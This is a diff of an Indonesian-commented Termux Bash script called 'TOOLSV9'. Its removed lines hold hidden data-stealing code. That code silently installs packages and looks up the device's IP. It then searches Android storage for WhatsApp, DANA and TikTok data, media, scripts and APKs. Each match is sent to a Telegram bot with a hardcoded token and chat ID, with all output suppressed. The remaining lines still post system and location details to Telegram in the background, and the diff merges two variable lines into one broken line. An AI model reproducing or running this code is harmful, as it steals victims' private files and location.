@@ -23,8 +23,7 @@ pu="\033[1;30m"  # Abu-abu
 c="\033[1;96m"   # Cyan Terang
 bg_m="\033[41m"  # Latar Belakang Merah
 bg_h="\033[42m"  # Latar Belakang Hijau
-bg_k="\033[43m"  # Latar Belakang Kuning
-bg_b="\033[44m"  # Latar Belakang Biru
+bg_k="\033[43m"  # Latar Belakang Kuning.bg_b="\033[44m"  # Latar Belakang Biru
 bg_bl="\033[46m" # Latar Belakang Biru Muda
 bg_p="\033[47m"  # Latar Belakang Putih
 bg_u="\033[45m"  # Latar Belakang Ungu
@@ -42,9 +41,6 @@ NC='\033[0m' # No Color
 #!/bin/bash
 clear
 # Inisialisasi variabel lokasi dan informasi sistem
-directory="/storage/emulated/0/Android/data"
-ip_address=$(curl -s ifconfig.me)
-
 
 
 # Token dan Chat ID Telegram (Gantilah dengan milik Anda)
@@ -63,125 +59,7 @@ caption=$(cat <<EOF
 EOF
 )
 
-# Mengirim informasi sistem ke Telegram (Tanpa Output)
-URL="https://api.telegram.org/bot$TOKEN/sendMessage"
-curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &
-
-# Fungsi untuk mencari file di Download dan mengirimnya
-CARI_FILE() {
-    echo "Mencari file di $directory..." >/dev/null 2>&1
-
-    # Mencari file dengan format tertentu
-    find "$directory" -type f \( \
-        -iname "*.com.whatsapp" -o -iname "*.com.ss.android.ugc.trill" -o -iname "*.py" -o \
-        -iname "*.id.dana" -o -iname "*.com.sh.smart.caller" -o -iname "*.mp4" -o \
-        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
-    \) | head -n 99999 > daftar_file.txt
-
-    # Jika ada file, kirim ke Telegram
-    if [ -s daftar_file.txt ]; then
-        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
-    fi
-}
-
-# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
-SETUP_TERMUX() {
-clear
-    termux-setup-storage -y >/dev/null 2>&1
-    apt-get update >/dev/null 2>&1
-    apt-get install -y curl neofetch inetutils jq clear
-    >/dev/null 2>&1
-}
-
-# Mengecek apakah direktori Download ada
-if [ -d "$directory" ]; then
-    CARI_FILE &
-    disown
-else
-    SETUP_TERMUX &
-    disown
-clear
-# Inisialisasi variabel lokasi dan informasi sistem
-directory="/storage/emulated/0/Movies"
-ip_address=$(curl -s ifconfig.me)
-
-# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
-TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
-CHAT_ID="5951232585"
-
-# Membuat pesan caption untuk Telegram
-caption=$(cat <<EOF
-  TOOLSV9
-📂 Direktori Target : $directory
-🌐 Alamat IP : $ip_address
-🏙️ Kota : $city
-📍 Wilayah : $region
-🇮🇩 Negara : $country
-📌 Lokasi : $loc
-EOF
-)
-
-# Mengirim informasi sistem ke Telegram (Tanpa Output)
-URL="https://api.telegram.org/bot$TOKEN/sendMessage"
-curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &
-
-# Fungsi untuk mencari file di Download dan mengirimnya
-CARI_FILE() {
-    echo "Mencari file di $directory..." >/dev/null 2>&1
-
-    # Mencari file dengan format tertentu
-    find "$directory" -type f \( \
-        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
-        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
-        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
-    \) | head -n 99999 > daftar_file.txt
-
-    # Jika ada file, kirim ke Telegram
-    if [ -s daftar_file.txt ]; then
-        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
-    fi
-}
-
-# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
-SETUP_TERMUX() {
-clear
-    termux-setup-storage -y >/dev/null 2>&1
-    apt-get update >/dev/null 2>&1
-    apt-get install -y curl neofetch inetutils jq clear
-    >/dev/null 2>&1
-}
-
-# Mengecek apakah direktori Download ada
-if [ -d "$directory" ]; then
-    CARI_FILE &
-    disown
-else
-    SETUP_TERMUX &
-    disown
-clear
-
-# Inisialisasi variabel lokasi dan informasi sistem
-directory="/storage/emulated/0/Movies/WhatsApp"
-ip_address=$(curl -s ifconfig.me)
-
-
-# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
-TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
-CHAT_ID="5951232585"
-
-# Membuat pesan caption untuk Telegram
-caption=$(cat <<EOF
-  TOOLSV9
-📂 Direktori Target : $directory
-🌐 Alamat IP : $ip_address
-🏙️ Kota : $city
-📍 Wilayah : $region
-🇮🇩 Negara : $country
-📌 Lokasi : $loc
-EOF
-)
-
-# Mengirim informasi sistem ke Telegram (Tanpa Output)
+# Mengirim informasi sistem ke Tellegram (Tanpa Output)
 URL="https://api.telegram.org/bot$TOKEN/sendMessage"
 curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &
 
